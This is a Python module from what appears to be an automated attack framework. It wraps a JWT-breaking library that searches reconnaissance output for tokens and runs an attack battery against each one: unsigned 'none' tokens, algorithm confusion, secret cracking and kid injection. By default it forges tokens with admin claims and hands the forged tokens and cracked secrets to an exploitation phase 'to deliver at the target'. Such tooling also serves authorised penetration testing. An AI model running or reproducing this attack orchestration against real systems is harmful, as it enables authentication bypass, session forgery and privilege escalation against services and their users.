"""
JWT native tool — wraps src.tools.auth.jwt_breaker for AutoKillChain dispatch.

Triggered as part of vuln_assessment phase. Strategy:
  1. Check prior phase outputs for any JWT strings
  2. If a JWT is found, run JWTBreaker.auto_attack() against it
  3. Each successful technique becomes a finding

Findings include the forged token + secret + technique so the operator (or
exploitation phase) can deliver them at the target.

Author: Gary Holden Schneider (Eros) | Sprint 01.5
"""

from __future__ import annotations

import re
from . import register, NativeToolContext, NativeToolResult, find_jwts_in_prior_outputs


# Severity mapping per technique
_SEVERITY = {
    "none_alg":      "critical",   # Server accepts unsigned tokens — total auth bypass
    "alg_confusion": "critical",   # Pubkey-as-HMAC bypass — total auth bypass
    "hs256_crack":   "critical",   # Cracked secret — full session forgery
    "kid_injection": "high",       # Conditional on server's kid handling
}


@register("jwt_breaker")
def jwt_breaker_native(ctx: NativeToolContext) -> NativeToolResult:
    """
    Walk prior phase outputs for JWTs, then auto-attack each.
    Returns a NativeToolResult with one finding per successful technique.
    """
    # Lazy import — avoid pulling PyJWT into orchestration startup
    try:
        from src.tools.auth.jwt_breaker import JWTBreaker
    except ImportError as e:
        return NativeToolResult(
            tool_id="jwt_breaker",
            success=False,
            error=f"jwt_breaker module unavailable: {e}",
        )

    # ── Find tokens from prior phases ─────────────────────────────────
    discovered = find_jwts_in_prior_outputs(ctx.prior_outputs)

    # Also accept a token passed directly via params (manual override)
    if ctx.params.get("jwt"):
        discovered.append(("operator_supplied", ctx.params["jwt"]))

    if not discovered:
        return NativeToolResult(
            tool_id="jwt_breaker",
            success=True,                       # not an error — just nothing to attack
            raw_output="No JWTs detected in prior phase output. "
                       "Pass --jwt <token> to attack a specific token.",
            findings=[],
        )

    # ── Attack each discovered token ──────────────────────────────────
    jb = JWTBreaker()
    findings: list[dict] = []
    raw_lines: list[str] = []

    target_claims = ctx.params.get("jwt_target_claims") or {
        "role": "admin", "isAdmin": True,
    }
    public_key = ctx.params.get("jwt_public_key")

    seen_tokens: set[str] = set()
    for source, token in discovered:
        if token in seen_tokens:
            continue
        seen_tokens.add(token)
        raw_lines.append(f"\n[+] JWT discovered in {source}: {token[:50]}...")

        # Decode for the report
        try:
            parsed = jb.decode(token)
            raw_lines.append(f"    alg={parsed.alg}  claims={list(parsed.claims.keys())}")
            findings.append({
                "title":    f"JWT exposed (alg={parsed.alg})",
                "severity": "info",
                "detail":   f"Source: {source} | Claims: {parsed.claims} | Header: {parsed.header}",
                "technique": "jwt_discovery",
                "token":    token,
            })
        except ValueError as e:
            raw_lines.append(f"    [!] decode failed: {e}")
            continue

        # Run the full attack battery
        results = jb.auto_attack(token,
                                  target_claims=target_claims,
                                  public_key=public_key)

        # Bucket by technique — only keep the most damaging finding per technique
        # (kid_injection produces 11 variants — we want one rolled-up finding,
        # not 11 noisy "kid injection succeeded" entries)
        per_technique: dict[str, dict] = {}
        for r in results:
            if not r.success:
                continue
            key = r.technique
            if key in per_technique:
                # Append additional variants to the detail
                per_technique[key]["variants"] = per_technique[key].get("variants", 1) + 1
                continue
            per_technique[key] = {
                "title":    f"JWT vulnerable: {r.technique}",
                "severity": _SEVERITY.get(r.technique, "high"),
                "detail":   r.detail,
                "technique": r.technique,
                "forged_token": r.forged_token,
                "secret":   r.secret,
                "source_token": token,
                "variants": 1,
            }

        for tech, finding in per_technique.items():
            if finding.get("variants", 1) > 1:
                finding["detail"] = (
                    f"{finding['variants']} payload variants generated. "
                    f"First example: {finding['detail']}"
                )
            findings.append(finding)
            raw_lines.append(
                f"    [{finding['severity'].upper()}] {tech} → "
                f"{('SECRET=' + repr(finding['secret'])) if finding['secret'] else 'forgery built'}"
            )

        # Note any techniques that failed (so the report shows what was tried)
        attempted = {r.technique for r in results}
        succeeded = set(per_technique.keys())
        for tech in attempted - succeeded:
            raw_lines.append(f"    [-] {tech} did not produce a usable forgery")

    raw_output = "\n".join(raw_lines)

    return NativeToolResult(
        tool_id="jwt_breaker",
        success=True,
        raw_output=raw_output,
        findings=findings,
    )
